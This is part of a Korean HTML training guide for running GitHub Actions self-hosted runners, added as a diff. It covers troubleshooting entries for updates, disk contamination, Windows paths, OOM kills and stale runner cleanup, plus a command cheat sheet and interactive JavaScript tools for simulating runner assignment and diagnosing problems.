+GIT_SSL_CAINFO=/etc/ssl/certs/ca-certificates.crt</span>
+<span class="c-st">EOF</span>
+<span class="c-pr">$ </span>sudo systemctl restart <span class="c-st">'actions.runner.*'</span>
+
+<span class="c-cm"># ③ 407이면 프록시 인증정보 확인. 특수문자는 URL 인코딩 필요 (@ → %40)</span></pre></div></div>
+      <div class="danger" style="margin-top:14px"><span class="cal-t">금지</span>
+        <code>GIT_SSL_NO_VERIFY=true</code>, <code>NODE_TLS_REJECT_UNAUTHORIZED=0</code>로 넘기는 건
+        MITM을 스스로 허용하는 것입니다. 임시 테스트 외에는 쓰지 마세요.</div>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-09</span>
+      <span class="acc-t">러너 자동 업데이트가 실패한다 (폐쇄망)</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">Runner update process failed. Downloading runner package failed.
+An error occurred: The runner version is too old and needs to be updated.</div>
+      <p>러너는 <code>objects.githubusercontent.com</code>에서 새 패키지를 내려받습니다. 이 도메인이 막히면 업데이트가 실패하고,
+      결국 버전이 너무 낮아져 잡을 받지 못합니다.</p>
+      <ul>
+        <li><b>단기</b>: 사내 미러/프록시에서 러너 tar.gz를 받아 수동 교체 (<code>svc.sh stop</code> → 압축 해제 → <code>svc.sh start</code>)</li>
+        <li><b>중기</b>: 방화벽에 <code>objects.githubusercontent.com</code>, <code>release-assets.githubusercontent.com</code> 허용 요청</li>
+        <li><b>장기</b>: 러너 이미지를 사내 레지스트리에서 빌드·배포하는 컨테이너 방식(10장)으로 전환하고, 자동 업데이트를 끄고(<code>--disableupdate</code>) 이미지 태그로 버전 관리</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-10</span>
+      <span class="acc-t">이전 잡의 흔적 때문에 빌드가 깨진다 (오염)</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">Error: Cannot find module 'xxx' (로컬에선 정상)
+Error: EACCES: permission denied, mkdir '/opt/actions-runner/_work/app/app/dist'
+갑자기 어제까지 되던 빌드가 실패 / 특정 러너에서만 실패</div>
+      <p>GitHub-hosted와 달리 self-hosted는 <b>같은 디스크를 재사용</b>합니다. 다음이 잔존해 문제를 만듭니다.</p>
+      <ul>
+        <li><b>node_modules / .venv / target</b> 캐시 불일치 → <code>actions/checkout</code>의 <code>clean: true</code> + 잡 종료 시 삭제</li>
+        <li><b>이전 잡이 root로 만든 파일</b>(컨테이너 잡의 볼륨 마운트) → 소유권 꼬임. 컨테이너 안에서 <code>--user $(id -u)</code> 사용</li>
+        <li><b>전역 설치된 툴 버전 충돌</b> → <code>setup-node</code>/<code>setup-python</code> 등으로 잡마다 버전 고정</li>
+        <li><b>환경변수·PATH 오염</b> → 러너 서비스 환경(<code>.env</code>)을 명시적으로 관리</li>
+      </ul>
+      <p><b>근본 해결은 ephemeral</b>입니다. 잡마다 새 러너(또는 새 컨테이너)를 쓰면 이 부류의 버그가 통째로 사라집니다.</p>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-11</span>
+      <span class="acc-t">Windows: 경로가 너무 길거나 파일이 잠겨 있다</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">Filename too long / The specified path, file name, or both are too long
+The process cannot access the file because it is being used by another process.</div>
+      <div class="code"><div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">PowerShell</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-cm"># ① 긴 경로 허용</span>
+<span class="c-pr">PS&gt; </span>Set-ItemProperty <span class="c-st">'HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem'</span> -Name LongPathsEnabled -Value <span class="c-nu">1</span>
+<span class="c-pr">PS&gt; </span>git config --system core.longpaths <span class="c-kw">true</span>
+
+<span class="c-cm"># ② 러너 작업 디렉터리를 짧게 (C:\r 처럼)</span>
+<span class="c-pr">PS&gt; </span>.\config.cmd --work <span class="c-st">"C:\r"</span> ...
+
+<span class="c-cm"># ③ 파일 잠금 유발 프로세스 찾기 (MSBuild/node가 남아있는 경우)</span>
+<span class="c-pr">PS&gt; </span>Get-Process node,MSBuild,dotnet -ErrorAction SilentlyContinue | Stop-Process -Force
+
+<span class="c-cm"># ④ 잡 마지막에 항상 정리 스텝 추가</span>
+<span class="c-cm">#    - if: always()</span>
+<span class="c-cm">#      run: Get-Process node -EA SilentlyContinue | Stop-Process -Force</span></pre></div></div>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-12</span>
+      <span class="acc-t">잡 실행 중 러너가 죽는다 (OOM / 강제 재시작)</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">The self-hosted runner: build-linux-01 lost communication with the server.
+The job has been marked as failed because the runner was shut down.</div>
+      <div class="code"><div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">원인 추적</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-cm"># OOM Killer가 죽였는지 확인</span>
+<span class="c-pr">$ </span>sudo dmesg -T | grep -iE <span class="c-st">'out of memory|killed process'</span> | tail
+<span class="c-out">[Wed Aug 12 03:11:44 2026] Out of memory: Killed process 48211 (node) total-vm:9.8G</span>
+
+<span class="c-cm"># systemd가 재시작했는지 확인</span>
+<span class="c-pr">$ </span>sudo journalctl -u <span class="c-st">'actions.runner.*'</span> --since <span class="c-st">'1 hour ago'</span> | grep -iE <span class="c-st">'stopped|started|killed'</span>
+
+<span class="c-cm"># 대응</span>
+<span class="c-cm"># · Node 힙 제한:   NODE_OPTIONS=--max-old-space-size=4096</span>
+<span class="c-cm"># · 병렬도 축소:    make -j2, jest --maxWorkers=2, gradle --max-workers=2</span>
+<span class="c-cm"># · systemd 가드:   MemoryMax=12G (호스트 전체가 멈추는 것 방지)</span>
+<span class="c-cm"># · swap 추가 또는 인스턴스 증설</span></pre></div></div>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-13</span>
+      <span class="acc-t">actions/cache · setup-* 액션이 self-hosted에서 이상하게 동작한다</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">Warning: Tool cache is not found. Please install ... to the tool cache directory
+Cache not found for input keys: ... (매번 캐시 미스)</div>
+      <ul>
+        <li><b>hostedtoolcache 부재</b> — GitHub-hosted에는 미리 설치된 툴 캐시(<code>/opt/hostedtoolcache</code>)가 있지만 self-hosted엔 없습니다. <code>setup-node</code>는 첫 실행 때 직접 내려받아 <code>_work/_tool</code>에 설치하니, <b>첫 잡만 느린 것은 정상</b>입니다.</li>
+        <li><b>ARM64 러너</b> — 일부 <code>setup-*</code> 액션이 arm64 바이너리를 제공하지 않아 실패할 수 있습니다. 이때는 OS 패키지로 툴체인을 미리 설치하고 액션을 생략합니다.</li>
+        <li><b>캐시 미스</b> — <code>actions/cache</code>는 GitHub 서버로 업/다운로드합니다. self-hosted에서는 로컬 디스크가 이미 남아있으니 캐시 액션을 <b>빼는 게</b> 더 빠른 경우가 많습니다.</li>
+        <li><b>ephemeral 러너</b>는 매번 초기화되므로 캐시 액션이 여전히 유용합니다 — 구성에 맞게 선택하세요.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-14</span>
+      <span class="acc-t">삭제한 러너가 목록에 남는다 / 이름 중복 오류</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">A runner exists with the same name
+Runner "build-linux-01" 이 Offline로 계속 목록에 남아있음</div>
+      <div class="code"><div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">정리 방법</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-cm"># ① 정상 절차: 러너 쪽에서 등록 해제 (remove 토큰 필요)</span>
+<span class="c-pr">$ </span><span class="c-kw">cd</span> /opt/actions-runner
+<span class="c-pr">$ </span>sudo ./svc.sh stop &amp;&amp; sudo ./svc.sh uninstall
+<span class="c-pr">$ </span>./config.sh remove --token &lt;REMOVE_TOKEN&gt;
+
+<span class="c-cm"># ② 서버가 이미 폐기된 경우: GitHub UI에서 삭제 또는 API로 강제 삭제</span>
+<span class="c-pr">$ </span>RUNNER_ID=$(curl -sS -H <span class="c-st">"Authorization: Bearer $GH_PAT"</span> \
+    <span class="c-st">"https://api.github.com/repos/OWNER/REPO/actions/runners"</span> \
+    | jq -r <span class="c-st">'.runners[] | select(.name=="build-linux-01") | .id'</span>)
+<span class="c-pr">$ </span>curl -sS -X DELETE -H <span class="c-st">"Authorization: Bearer $GH_PAT"</span> \
+    <span class="c-st">"https://api.github.com/repos/OWNER/REPO/actions/runners/$RUNNER_ID"</span>
+
+<span class="c-cm"># ③ 재설치인데 같은 이름을 쓰고 싶다면</span>
+<span class="c-pr">$ </span>./config.sh --url ... --token ... --name build-linux-01 --replace</pre></div></div>
+    </div>
+  </div>
+</section>
+<!-- ============ 13 ============ -->
+<section id="s13">
+  <div class="sec-head"><div class="sec-num">13</div>
+    <div><h2>증상별 진단 도우미</h2>
+    <div class="sec-sub">질문에 답하면 원인 후보와 명령을 알려줍니다</div></div>
+  </div>
+
+  <div class="demo">
+    <div class="demo-h">
+      <div class="demo-t">🔎 러너 장애 진단기</div>
+      <span class="demo-tag">클릭으로 따라가기</span>
+    </div>
+    <div id="dxCrumb" style="font-family:var(--mono);font-size:10.5px;color:var(--muted);margin-bottom:14px;letter-spacing:.05em"></div>
+    <div id="dxBody"></div>
+    <div class="btn-row" style="margin-top:16px">
+      <button class="btn" onclick="dxGo('start')">↺ 처음부터</button>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 14 ============ -->
+<section id="s14">
+  <div class="sec-head"><div class="sec-num">14</div>
+    <div><h2>구축 체크리스트</h2>
+    <div class="sec-sub">실제 도입 시 이 순서대로 확인하면 빠뜨리는 게 없습니다</div></div>
+  </div>
+
+  <div style="font-family:var(--mono);font-size:11.5px;color:var(--text-2);display:flex;justify-content:space-between">
+    <span>진행률</span><span id="ckCount">0 / 16</span>
+  </div>
+  <div class="ck-bar"><i id="ckBar"></i></div>
+  <div id="ckList"></div>
+  <div class="tip" id="ckDone" style="display:none"><span class="cal-t">완료</span>
+    16개 항목을 모두 확인했습니다. 이제 이 체크리스트를 팀 위키에 복사해 러너 표준 구축 절차서로 쓰세요.
+  </div>
+</section>
+
+<!-- ============ 15 ============ -->
+<section id="s15">
+  <div class="sec-head"><div class="sec-num">15</div>
+    <div><h2>이해도 퀴즈 10문항</h2>
+    <div class="sec-sub">틀려도 해설이 나오니 부담 없이 눌러보세요</div></div>
+  </div>
+  <div id="quizBox"></div>
+  <div class="score" id="quizScore">아직 답하지 않았습니다 — <b>0</b> / 10</div>
+</section>
+
+<!-- ============ 16 ============ -->
+<section id="s16">
+  <div class="sec-head"><div class="sec-num">16</div>
+    <div><h2>치트시트 &amp; 참고자료</h2>
+    <div class="sec-sub">터미널 옆에 띄워두고 쓰는 요약</div></div>
+  </div>
+
+  <h3>명령어 요약</h3>
+  <div class="tw"><table>
+    <thead><tr><th style="width:44%">명령</th><th>용도</th></tr></thead>
+    <tbody>
+      <tr><td><code>./config.sh --url URL --token TOKEN</code></td><td>러너 등록</td></tr>
+      <tr><td><code>./config.sh remove --token TOKEN</code></td><td>러너 등록 해제</td></tr>
+      <tr><td><code>./run.sh</code></td><td>포그라운드 실행(테스트용)</td></tr>
+      <tr><td><code>sudo ./svc.sh install &lt;user&gt;</code></td><td>systemd 서비스 등록</td></tr>
+      <tr><td><code>sudo ./svc.sh start | stop | status</code></td><td>서비스 제어</td></tr>
+      <tr><td><code>sudo ./bin/installdependencies.sh</code></td><td>.NET 의존 패키지 설치</td></tr>
+      <tr><td><code>journalctl -u 'actions.runner.*' -f</code></td><td>실시간 서비스 로그</td></tr>
+      <tr><td><code>tail -f _diag/Runner_*.log</code></td><td>리스너(에이전트) 로그</td></tr>
+      <tr><td><code>tail -f _diag/Worker_*.log</code></td><td>잡 실행 로그</td></tr>
+      <tr><td><code>docker system df</code> / <code>builder prune -af</code></td><td>디스크 점검·회수</td></tr>
+      <tr><td><code>kubectl logs -n arc-systems -l app.kubernetes.io/component=runner-scale-set-listener</code></td><td>ARC 리스너 로그</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>주요 옵션</h3>
+  <div class="tw"><table>
+    <thead><tr><th style="width:28%">옵션</th><th>설명</th></tr></thead>
+    <tbody>
+      <tr><td><code>--name</code></td><td>러너 표시 이름(호스트 식별). 중복 시 <code>--replace</code> 필요</td></tr>
+      <tr><td><code>--labels</code></td><td>커스텀 라벨(쉼표 구분). 기본 라벨에 추가됨</td></tr>
+      <tr><td><code>--runnergroup</code></td><td>Org/Enterprise 러너 그룹 지정</td></tr>
+      <tr><td><code>--work</code></td><td>작업 디렉터리(기본 <code>_work</code>). Windows는 짧은 경로 권장</td></tr>
+      <tr><td><code>--ephemeral</code></td><td>잡 1개 처리 후 자동 등록 해제 — 보안·격리 권장 옵션</td></tr>
+      <tr><td><code>--unattended</code></td><td>대화형 질문 없이 진행(자동화 필수)</td></tr>
+      <tr><td><code>--replace</code></td><td>동일 이름 러너를 교체</td></tr>
+      <tr><td><code>--disableupdate</code></td><td>자동 업데이트 비활성(이미지로 버전 관리할 때)</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>알아두면 좋은 환경변수 (잡 안에서 사용)</h3>
+  <div class="grid g4">
+    <div class="card" style="padding:14px"><code>RUNNER_NAME</code><div style="font-size:13.4px;color:var(--muted);margin-top:5px">현재 러너 이름</div></div>
+    <div class="card" style="padding:14px"><code>RUNNER_OS</code><div style="font-size:13.4px;color:var(--muted);margin-top:5px">Linux / Windows / macOS</div></div>
+    <div class="card" style="padding:14px"><code>RUNNER_ARCH</code><div style="font-size:13.4px;color:var(--muted);margin-top:5px">X64 / ARM64</div></div>
+    <div class="card" style="padding:14px"><code>GITHUB_WORKSPACE</code><div style="font-size:13.4px;color:var(--muted);margin-top:5px">체크아웃 경로</div></div>
+  </div>
+
+  <h3>공식 문서</h3>
+  <ul>
+    <li><a class="link" href="https://docs.github.com/en/actions/hosting-your-own-runners" target="_blank" rel="noopener">GitHub Docs — 자체 러너 호스팅</a> (설치·라벨·그룹 전반)</li>
+    <li><a class="link" href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions" target="_blank" rel="noopener">GitHub Docs — Actions 보안 강화</a> (Public 리포 경고, 최소 권한)</li>
+    <li><a class="link" href="https://github.com/actions/runner" target="_blank" rel="noopener">actions/runner</a> (러너 릴리스·SHA256·변경 이력)</li>
+    <li><a class="link" href="https://github.com/actions/actions-runner-controller" target="_blank" rel="noopener">actions/actions-runner-controller</a> (Kubernetes ARC)</li>
+    <li><a class="link" href="https://api.github.com/meta" target="_blank" rel="noopener">api.github.com/meta</a> (방화벽 허용 IP 대역 — <code>actions</code> 키)</li>
+  </ul>
+
+  <div class="tip"><span class="cal-t">다음 단계 학습 로드맵</span>
+    ① 이 문서로 러너 1대 구축 → ② ephemeral 러너로 전환해 오염 문제 체감 →
+    ③ ARC로 오토스케일 구성 → ④ OIDC 기반 클라우드 인증(장기 키 제거) →
+    ⑤ 러너 이미지 빌드 파이프라인(자체 이미지 + 사내 레지스트리)까지 가면 사내 CI 플랫폼 담당자 수준입니다.
+  </div>
+</section>
+
+<footer>
+  <div style="font-family:var(--mono);font-size:11px;letter-spacing:.1em;color:var(--runner);text-transform:uppercase;margin-bottom:10px">End of guide</div>
+  <p style="margin-bottom:6px">GitHub Actions Self-Hosted Runner 완전 가이드 · 신입 DevOps 엔지니어 온보딩용 실습 교재</p>
+  <p style="font-size:12.6px;color:var(--muted);margin:0">
+    러너 버전·CLI 옵션·ARC 차트는 업데이트가 잦습니다. 실제 구축 전 <code>actions/runner</code> 릴리스 노트와 공식 문서를 함께 확인하세요.
+    문서 내 토큰·도메인·호스트명은 모두 예시 값입니다.
+  </p>
+</footer>
+</main>
+</div>
+<a href="#" class="toplink" id="toplink" aria-label="맨 위로">↑</a>
+<script>
+/* ========== 1. 탭 / 복사 / 아코디언 ========== */
+function tab(btn,i){
+  const bar=btn.closest('.code-bar'), box=btn.closest('.code');
+  bar.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  btn.classList.add('active');
+  box.querySelectorAll('.pane').forEach((p,idx)=>p.classList.toggle('active',idx===i));
+}
+function cp(btn){
+  const pane=btn.closest('.code').querySelector('.pane.active pre');
+  const text=pane.innerText.split('\n')
+    .map(l=>l.replace(/^\$\s/,'').replace(/^PS>\s/,''))
+    .join('\n');
+  const done=()=>{const o=btn.textContent;btn.textContent='복사됨';btn.classList.add('done');
+    setTimeout(()=>{btn.textContent=o;btn.classList.remove('done');},1400);};
+  if(navigator.clipboard){navigator.clipboard.writeText(text).then(done,done);}
+  else{const ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);
+    ta.select();try{document.execCommand('copy');}catch(e){}ta.remove();done();}
+}
+function acc(btn){ btn.parentElement.classList.toggle('open'); }
+
+/* ========== 2. 러너 배정 시뮬레이터 ========== */
+const SIM_PRESET={
+  linux:{n:'build-app',   need:['self-hosted','Linux','X64']},
+  gpu:  {n:'train-model', need:['self-hosted','Linux','X64','gpu']},
+  win:  {n:'build-dotnet',need:['self-hosted','Windows','X64']},
+  mac:  {n:'build-ios',   need:['self-hosted','macOS','ARM64']}
+};
+const SIM_BASE=[
+  {name:'build-linux-01', labels:['self-hosted','Linux','X64','docker','build'], state:'idle'},
+  {name:'gpu-node-01',    labels:['self-hosted','Linux','X64','gpu'],           state:'idle'},
+  {name:'build-win-01',   labels:['self-hosted','Windows','X64'],               state:'off'}
+];
+let simR=JSON.parse(JSON.stringify(SIM_BASE)), simJ=[], simSeq=0, simTick=0, simPoll=-1;
+
+function simLog(cls,msg){
+  const box=document.getElementById('simLog'); if(!box) return;
+  const n=new Date(), z=v=>String(v).padStart(2,'0');
+  const t=z(n.getHours())+':'+z(n.getMinutes())+':'+z(n.getSeconds());
+  const d=document.createElement('div');
+  d.innerHTML='<span class="t">'+t+'</span> <span class="'+cls+'">'+msg+'</span>';
+  box.appendChild(d); box.scrollTop=box.scrollHeight;
+  while(box.children.length>60) box.removeChild(box.firstChild);
+}
+function simAdd(kind){
+  const p=SIM_PRESET[kind]; simSeq++;
+  simJ.push({id:simSeq,name:p.n+'#'+simSeq,need:p.need.slice(),state:'queued',age:0,left:3,warned:false});
+  simLog('q','잡 큐 적재: '+p.n+'#'+simSeq+'  runs-on: ['+p.need.join(', ')+']');
+  simRender();
+}
+function simToggle(i){
+  const r=simR[i];
+  r.state = (r.state==='off') ? 'idle' : 'off';
+  simLog(r.state==='off'?'er':'ok', '러너 '+r.name+' → '+(r.state==='off'?'Offline (전원/서비스 중단)':'Online (Idle)'));
+  simRender();
+}
+function simReset(){
+  simR=JSON.parse(JSON.stringify(SIM_BASE)); simJ=[]; simSeq=0; simTick=0;
+  document.getElementById('simLog').innerHTML='';
+  simLog('cl','초기화 완료 — 러너 3대 등록 (Windows 러너는 Offline 상태)');
+  simRender();
+}
+function simMatch(job,r){ // 라벨 AND 조건 (대소문자 무시)
+  const have=r.labels.map(x=>x.toLowerCase());
+  return job.need.every(n=>have.includes(n.toLowerCase()));
+}
+function simStep(){
+  simTick++;
+  // 실행 중인 잡 진행
+  simR.forEach(r=>{
+    if(r.state==='busy'){
+      const j=simJ.find(x=>x.id===r.jobId);
+      if(j){ j.left--; if(j.left<=0){ j.state='done'; r.state='idle'; delete r.jobId;
+        simLog('ok','잡 완료: '+j.name+' (러너 '+r.name+' → Idle 복귀, 워크스페이스는 남아있음)'); } }
+    }
+  });
+  // Idle 러너가 폴링하며 잡 획득
+  simR.forEach(r=>{
+    if(r.state!=='idle') return;
+    const j=simJ.find(x=>x.state==='queued'&&simMatch(x,r));
+    if(j){ j.state='running'; r.state='busy'; r.jobId=j.id;
+      simLog('ok','배정: '+j.name+' → '+r.name+'  (라벨 전부 일치)'); }
+  });
+  // 대기 시간 누적 & 무한 대기 경고
+  simJ.filter(j=>j.state==='queued').forEach(j=>{
+    j.age++;
+    if(j.age===6&&!j.warned){ j.warned=true; j.state='stuck';
+      const any=simR.some(r=>simMatch(j,r));
+      simLog('er','⚠ '+j.name+' 무한 대기 — '+(any
+        ? '조건에 맞는 러너가 Offline 상태입니다'
+        : '['+j.need.join(', ')+'] 라벨을 가진 러너가 아예 없습니다'));
+    }
+  });
+  // stuck 잡도 러너가 살아나면 다시 잡히도록
+  simJ.filter(j=>j.state==='stuck').forEach(j=>{
+    const r=simR.find(r=>r.state==='idle'&&simMatch(j,r));
+    if(r){ j.state='running'; r.state='busy'; r.jobId=j.id;
+      simLog('ok','복구 배정: '+j.name+' → '+r.name); }
+  });
+  // 폴링 표시 (2틱마다)
+  if(simTick%2===0){ simPoll=simTick; }
+  simRender();
+}
+function simRender(){
+  const jb=document.getElementById('simJobs'); if(!jb) return;
+  const q=simJ.filter(j=>j.state==='queued'||j.state==='stuck').length;
+  document.getElementById('simQn').textContent=q+' queued';
+  document.getElementById('simRn').textContent=simR.filter(r=>r.state!=='off').length+'/3 online';
+  const shown=simJ.slice(-6);
+  jb.innerHTML = shown.length? shown.map(j=>{
+    const st={queued:'Queued',running:'In progress',done:'Success',stuck:'Queued (대기 중)'}[j.state];
+    return '<div class="job '+j.state+'"><span>'+j.name+'<span class="lbls"> ['+j.need.join(', ')+']</span></span>'
+      +'<span style="flex:0 0 auto;color:var(--muted)">'+st+'</span></div>';
+  }).join('') : '<div style="font-family:var(--mono);font-size:11px;color:var(--muted);padding:14px 0;text-align:center">잡을 추가해 보세요</div>';
+
+  document.getElementById('simRunners').innerHTML=simR.map((r,i)=>{
+    const dot=r.state==='off'?'off':(r.state==='busy'?'busy':'idle');
+    const label={off:'Offline',busy:'Active',idle:'Idle'}[r.state];
+    const job=r.state==='busy'?(simJ.find(x=>x.id===r.jobId)||{}).name:'';
+    const activeNeed=simJ.filter(j=>j.state==='queued'||j.state==='stuck').flatMap(j=>j.need).map(s=>s.toLowerCase());
+    const polling=(r.state==='idle'&&simPoll===simTick);
+    return '<div class="rnr '+(r.state==='busy'?'busy':'')+(r.state==='off'?' off':'')+'">'
+      +'<div class="rnr-top"><span><span class="dot '+dot+'"></span> '+r.name+'</span>'
+      +'<span style="color:var(--muted)">'+label+'</span></div>'
+      +'<div class="rnr-lbls">'+r.labels.map(l=>'<span class="tagl'
+        +(activeNeed.includes(l.toLowerCase())?' match':'')+'">'+l+'</span>').join('')+'</div>'
+      +(job?'<div style="font-family:var(--mono);font-size:10px;color:var(--runner);margin-top:7px">▶ '+job+' 실행 중…</div>':'')
+      +(r.state==='off'?'':'<div class="poll '+(polling?'on':'')+'">↑ GET /runners/{id}/jobs (long poll)</div>')
+      +'</div>';
+  }).join('');
+}
+
+/* ========== 3. config 명령어 생성기 ========== */
+function gen(){
+  const scope=document.getElementById('gScope').value;
+  const owner=document.getElementById('gOwner').value.trim()||'OWNER';
+  const repo=document.getElementById('gRepo').value.trim()||'REPO';
+  const os=document.getElementById('gOs').value;
+  const name=document.getElementById('gName').value.trim()||'runner-01';
+  const extra=document.getElementById('gLabels').value.trim();
+  const group=document.getElementById('gGroup').value.trim();
+  const eph=document.getElementById('gEph').checked;
+  const unatt=document.getElementById('gUnatt').checked;
+  const repl=document.getElementById('gRepl').checked;
+  document.getElementById('gRepoWrap').style.display = (scope==='repo')?'block':'none';
+
+  let url, tokenPath;
+  if(scope==='repo'){ url='https://github.com/'+owner+'/'+repo;
+    tokenPath='리포지토리 → Settings → Actions → Runners → New self-hosted runner'; }
+  else if(scope==='org'){ url='https://github.com/'+owner;
+    tokenPath='Org → Settings → Actions → Runners → New runner'; }
+  else { url='https://github.com/enterprises/'+owner;
+    tokenPath='Enterprise → Policies → Actions → Runners → New runner'; }
+
+  const osLabel={'linux-x64':['Linux','X64'],'linux-arm64':['Linux','ARM64'],
+                 'win-x64':['Windows','X64'],'osx-arm64':['macOS','ARM64']}[os];
+  const isWin=(os==='win-x64');
+  const cfg=isWin?'.\\config.cmd':'./config.sh';
+  const pkg='actions-runner-'+(os==='win-x64'?'win-x64':os)+'-<VERSION>'+(isWin?'.zip':'.tar.gz');
+  const allLabels=['self-hosted'].concat(osLabel).concat(extra?extra.split(',').map(s=>s.trim()).filter(Boolean):[]);
+
+  let cmd='# 토큰 발급 경로: '+tokenPath+'\n';
+  cmd+='# 다운로드 패키지: '+pkg+'\n\n';
+  const cont=isWin?' `':' \\';
+  const lines=[cfg+' \\'.replace(' \\',cont),
+    '  --url '+url+cont,
+    '  --token <REGISTRATION_TOKEN>'+cont,
+    '  --name '+name+cont,
+    '  --labels '+allLabels.join(',')+cont,
+    '  --work '+(isWin?'C:\\r':'_work')];
+  if(scope!=='repo'&&group) lines.push('  --runnergroup '+group);
+  if(eph) lines.push('  --ephemeral');
+  if(repl) lines.push('  --replace');
+  if(unatt) lines.push('  --unattended');
+  // 연결 문자 정리: 마지막 줄에는 붙이지 않는다
+  const body=lines.map((l,i)=>{
+    let s=l.replace(/( \\| `)$/,'');
+    return s + (i<lines.length-1 ? cont : '');
+  }).join('\n');
+  cmd+=body+'\n\n# 등록 후 실행\n'+(isWin?'.\\run.cmd':'./run.sh')
+     +'\n# 상시 운영은 서비스로: '+(isWin?'.\\config.cmd --runasservice':'sudo ./svc.sh install && sudo ./svc.sh start');
+
+  document.getElementById('genOut').textContent=cmd;
+
+  const y='jobs:\n  build:\n    runs-on:'
+    + (scope!=='repo'&&group&&group!=='default'
+        ? '\n      group: '+group+'\n      labels: ['+allLabels.join(', ')+']'
+        : ' ['+allLabels.join(', ')+']')
+    + '\n    timeout-minutes: 30\n    steps:\n      - uses: actions/checkout@v4\n'
+    + '      - run: echo "러너 $RUNNER_NAME 에서 실행 중"';
+  document.getElementById('genYaml').textContent=y;
+}
+
+/* ========== 4. 진단 도우미 ========== */
+const DX={
+ start:{t:'증상 선택',q:'어떤 증상인가요?',o:[
+   ['잡이 Queued에서 시작되지 않음','q_queued'],
+   ['러너가 Offline / 목록에서 사라짐','q_offline'],
+   ['config.sh 등록 단계에서 실패','q_config'],
+   ['잡이 실행되다가 실패','q_fail'],
+   ['동작은 하는데 너무 느림 / 큐 적체','q_slow']]},
+
+ q_queued:{t:'Queued 멈춤',q:'GitHub Settings → Runners에서 러너 상태는 어떻게 보이나요?',o:[
+   ['🟢 Idle (대기 중)','r_label'],
+   ['🟡 Active (다른 잡 실행 중)','r_capacity'],
+   ['🔴 Offline','q_offline'],
+   ['목록에 아예 없음','r_notreg']]},
+
+ q_offline:{t:'러너 Offline',q:'러너 서버에서 systemctl status 결과는?',o:[
+   ['active (running) — 살아있음','r_network'],
+   ['inactive / dead — 죽어있음','r_svcstart'],
+   ['계속 재시작 반복 (10초 주기 로그)','r_reregister'],
+   ['서비스로 등록한 적 없음 (run.sh만 씀)','r_svcinstall']]},
+
+ q_config:{t:'등록 실패',q:'출력된 에러에 가장 가까운 것은?',o:[
+   ['404 / NotFound','r_404'],['401 / Invalid configuration for token','r_401'],
+   ['libicu · DllNotFoundException','r_icu'],['SSL certificate problem · 407','r_ssl']]},
+
+ q_fail:{t:'잡 실행 실패',q:'잡 로그의 에러 메시지는?',o:[
+   ['docker … permission denied','r_docker'],
+   ['No space left on device','r_disk'],
+   ['runner lost communication / was shut down','r_oom'],
+   ['모듈 없음 · 권한 꼬임 · 특정 러너만 실패','r_dirty'],
+   ['SSL certificate problem','r_ssl']]},
+
+ q_slow:{t:'성능/적체',q:'느린 지점이 어디인가요?',o:[
+   ['잡 시작까지 대기가 길다 (Queued 시간)','r_capacity'],
+   ['잡이 시작된 뒤 실행이 느리다','r_perf']]},
+
+ r_label:{t:'라벨 불일치 (TS-01)',c:'러너는 정상인데 잡의 runs-on 라벨을 러너가 전부 갖고 있지 않습니다. 라벨 매칭은 AND 조건이며, 커스텀 라벨 오타가 대표적 원인입니다.',
+   cmd:'curl -sS -H "Authorization: Bearer $GH_PAT" \\\n  "https://api.github.com/repos/OWNER/REPO/actions/runners" \\\n| jq -r \'.runners[] | "\\(.name)\\t\\([.labels[].name]|join(","))"\'\n\n# 위 결과와 워크플로우의 runs-on 값을 한 글자씩 대조\ngrep -n "runs-on" .github/workflows/*.yml'},
+ r_capacity:{t:'러너 용량 부족 (고장 아님)',c:'러너 1대는 동시에 잡 1개만 처리합니다. PR이 몰리면 큐가 쌓입니다. 러너 대수를 늘리거나 ARC 오토스케일링(10장)으로 전환하세요. 매트릭스 잡은 라벨당 동시 실행 수를 곱해서 계산해야 합니다.',
+   cmd:'# 현재 busy 상태 확인\ncurl -sS -H "Authorization: Bearer $GH_PAT" \\\n  "https://api.github.com/orgs/ORG/actions/runners" \\\n| jq -r \'.runners[] | "\\(.name) busy=\\(.busy)"\'\n\n# 단기 대응: 같은 라벨의 러너를 1~2대 추가 등록'},
+ r_notreg:{t:'등록 범위 불일치 또는 미등록',c:'해당 리포지토리/조직에 러너가 등록되지 않았습니다. 리포지토리 러너는 다른 리포에서 쓸 수 없습니다. Org 러너로 등록하거나 Runner Group의 리포 접근 권한을 확인하세요.',
+   cmd:'# 등록 여부 확인 (러너 서버에서)\nls -la /opt/actions-runner/.runner /opt/actions-runner/.credentials\ncat /opt/actions-runner/.runner   # gitHubUrl / agentName 확인'},
